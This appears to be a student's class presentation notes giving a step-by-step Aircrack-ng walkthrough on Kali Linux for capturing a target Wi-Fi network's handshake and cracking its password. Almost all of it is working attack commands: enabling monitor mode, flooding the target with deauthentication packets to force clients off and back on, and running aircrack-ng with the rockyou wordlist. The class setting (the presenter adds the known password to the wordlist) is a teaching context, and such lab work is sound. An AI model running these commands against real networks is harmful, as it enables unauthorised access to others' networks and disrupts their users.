# UCLA Final Presentation: Aircrack-ng on Kali Linux
Verify airmon-ng has no issues:
<pre><code>sudo airmon-ng check</code></pre>

Determine name of wireless adapter:
<pre><code>sudo iwconfig</code></pre>

Enable monitor mode in the Wi-Fi card:
<pre><code>sudo airmon-ng start wlan0</code></pre>
  - Do not close terminal.

Capture the network packets:
<pre><code>sudo airodump-ng wlan0mon</code></pre>

Identify target network an note BSSID (MAC address) and channel
<pre><code>sudo airodump-ng --bssid (BSSID) -c (channel) -w (capture file output name) wlan0mon</code></pre>

While packets are capturing, open a seperate terminal and run the command:
<pre><code>sudo aireplay-ng --deauth 100 -a (BSSID) wlan0mon</code></pre>
  - Sends deauthentification packets to the target netowrk and forces clients to reconnect and sent their login credentials

Stop catpure with "ctrl + c"

Unzip rockyou.txt and create path to wordlist:

Locate rockyou.txt in Kali Linux:
<pre><code>cd /usr/share/wordlists</code></pre>
<pre><code>ls</code></pre>
It will present as <pre><code>rockyou.txt.gz</code></pre>
Unzip rockyou.txt:
<pre><code>sudo gunzip rockyou.txt.gz</code></pre>

Nano into rockyou.txt and add designated password

Save document

Crack password:
<pre><code>sudo aircrack-ng -b (BSSID) -w (path to wordlist) (captire file name).cap</code></pre>
